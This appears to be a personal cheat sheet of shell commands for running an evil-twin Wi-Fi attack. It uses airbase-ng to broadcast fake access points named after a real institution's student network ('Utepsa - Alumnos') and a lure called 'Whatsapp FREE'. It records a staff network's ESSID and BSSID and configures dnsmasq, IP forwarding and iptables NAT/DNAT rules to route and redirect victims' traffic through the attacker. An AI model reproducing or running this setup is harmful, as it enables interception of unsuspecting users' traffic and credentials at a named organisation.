
airmon-ng start wlan0 3

modprobe tun
airbase-ng -I 100 -P -C 2 --channel 3 --essid "Utepsa - Alumnos" mon0
airbase-ng -I 100 --channel 3 --essid "Whatsapp FREE" mon0

ifconfig at0 192.168.10.1 netmask 255.255.255.0
route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1 at0

/etc/init.d/dnsmasq start
/etc/init.d/iptables start

MAC wifri 00:40:F4:E3:B0:90

ESSID: Utepsa - Docentes
BSSID: 00:02:6F:56:EB:41

Current MAC: 64:27:37:a2:49:c3 (unknown)



iptables --table filter --flush 
iptables --table nat --flush
iptables --table filter --delete-chain
iptables --table nat --delete-chain
iptables --table filter --append FORWARD --in-interface at0 --out-interface -j ACCEPT
iptables --table nat --append PREROUTING -p udp -j DNAT --to 192.168.42.129
iptables --table nat --append POSTROUTING --out-interface usb0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

nano /etc/sysctl.conf 
net.ipv4.conf.default.forwarding=1 net.ipv4.conf.all.forwarding=1

--
iptables --table filter --append FORWARD --in-interface wlan0  --out-interface eth0 -m state --state NEW,ESTABLISHED,RELATED,INVALID -j ACCEPT
iptables --table filter --append FORWARD --in-interface wlan0  --out-interface eth0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE


